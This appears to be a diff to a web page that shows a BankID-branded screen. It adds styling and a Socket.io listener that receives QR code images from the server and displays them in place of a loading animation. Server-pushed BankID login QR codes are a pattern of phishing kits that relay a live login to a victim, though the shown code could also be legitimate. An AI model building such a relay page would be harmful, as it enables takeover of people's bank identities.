@@ -304,6 +304,23 @@
                 transform: scale(2);
             }
         }
+
+        #loadingElement {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    text-align: center;
+}
+
+#qrImage {
+    /* width: 80%; */
+    height: auto;
+    margin-top: 200px; /* Adjust as needed */
+    display: block;
+    margin-left: auto;
+    margin-right: auto;
+}
     </style>
 </head>
 <body>
@@ -454,12 +471,12 @@
     </div>
 
     <script>
+            const hidee = document.getElementById("hidee");
 
         function showBankIDLogo() {
 
             const supportMenu = document.getElementsByClassName('support-menu')[0];
             const footer = document.getElementsByClassName('footer')[0];
-            const hidee = document.getElementById("hidee");
 
             supportMenu.style.display = 'none';
             footer.style.display = 'none';
@@ -506,6 +523,21 @@
             supportModal.style.display = 'none';
             }
         });
+
+        
+        const socket = io(); // Initialize Socket.io connection
+    // const loadingElement = document.getElementById('hidee');
+    const qrImage = document.getElementById('qrImage');
+
+    // loadingElement.style.display = 'block'; // Ensure it's visible initially
+    qrImage.style.display = 'none'; // Ensure the QR code is hidden initially
+
+    socket.on('update_qr_code_image', function (data) {
+    console.log('QR code image received:', data.qr_image); // Debug: Check if data is received
+    qrImage.src = 'data:image/png;base64,' + data.qr_image;
+    hidee.style.display = 'none'; // Hide loading animation
+    qrImage.style.display = 'block'; // Show QR code image
+});
     </script>
 </body>
 </html>
